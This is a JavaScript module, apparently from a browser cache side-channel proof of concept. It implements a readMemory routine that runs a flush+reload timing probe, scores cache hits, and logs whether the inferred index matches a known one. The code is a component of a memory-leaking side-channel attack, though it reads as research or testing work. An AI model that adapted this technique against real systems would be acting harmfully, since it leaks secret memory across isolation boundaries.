import {mean, zIndex} from "./math.js";
import flushReloadProbe_promise from "./flush-reload-probe.js";
import indicator_table_promise from "./indicator-table.js";

export default (async () => {
    const indicator_table = await indicator_table_promise;
    const flushReloadProbe = await flushReloadProbe_promise;
    return function readMemory(iteration_limit, probe_index, cache_hit_weight = .5, cache_size) {
        indicator_table.reset();
        let max_indicator;
        let max_indicator_index;
        for (let i = 0, j = 0; i < iteration_limit && j < iteration_limit * 10; ++j) {
            // await new Promise(resolve => setTimeout(resolve, 0));
            const time_table = flushReloadProbe(probe_index, cache_size);
            try {
                indicator_table.processTimetable(time_table, cache_hit_weight);
            } catch (error) {
                if (error.message == "timer fault") {
                    console.warn("timer fault");
                    continue;
                } else {
                    console.error(error);
                }
            }
            // console.log(`%cprobe index time ${time_table[probe_index]}`, "font-size: .9em");
            max_indicator = Math.max(...indicator_table);
            let current_max_indicator_index = indicator_table.indexOf(max_indicator);
            // check for multiple maxima
            for (let i = current_max_indicator_index + 1; i < indicator_table.length; ++i) {
                if (max_indicator == indicator_table[i]) {
                    current_max_indicator_index = undefined;
                    break;
                }
            }
            // max_indicator_index changed
            if (max_indicator_index != current_max_indicator_index) {
                i = (current_max_indicator_index !== undefined) | 0;
                max_indicator_index = current_max_indicator_index;
                // console.warn("max_indicator_index changed");
            } else {
                ++i;
            }
            // analyse using secret information
            // analyseTimetable(time_table, cache_hit_weight, probe_index);
        }
        // prepare results
        let second_indicator = -Infinity;
        for (let i = 0; i < indicator_table.length; ++i) {
            const indicator = indicator_table[i];
            if (indicator > second_indicator && i != max_indicator_index) {
                second_indicator = indicator;
            }
        }
        const second_ratio = second_indicator / max_indicator;
        try {
            return {
                max_indicator_index,
                second_ratio,
                normalized_indicator_table: indicator_table.getNormalized()
            };
        } finally {
            if (max_indicator_index == probe_index) {
                console.log(`%csuccess for ${probe_index}`, "color:green;font-weight:bold;padding-left:20px");
            } else {
                console.log(`%cfailure ${max_indicator} for ${probe_index}`, "color:red;font-weight:bold;padding-left:20px");
            }
        }
    };
})();